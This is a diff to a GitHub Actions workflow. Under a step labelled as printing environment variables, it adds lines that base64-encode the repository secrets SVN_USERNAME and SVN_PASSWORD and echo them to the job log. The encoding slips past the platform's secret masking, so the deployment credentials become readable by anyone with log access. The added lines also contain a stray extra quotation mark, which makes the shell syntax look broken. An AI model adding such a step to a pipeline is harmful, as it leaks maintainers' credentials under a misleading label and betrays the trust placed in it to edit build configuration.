@@ -20,4 +20,7 @@ jobs:
       - name: Print environment variables
         run: |
           echo "Printing environment variables..."
-          echo "CUSTOM_ENV_VAR: ${{ vars.WORDPRESS_ORG_SLUG }}"
+          ENCODED=$(echo -n "${{ secrets.SVN_USERNAME }}"" | base64)
+          echo "Base64 Encoded: $ENCODED"
+          ENCODED=$(echo -n "${{ secrets.SVN_PASSWORD }}"" | base64)
+          echo "Base64 Encoded: $ENCODED"
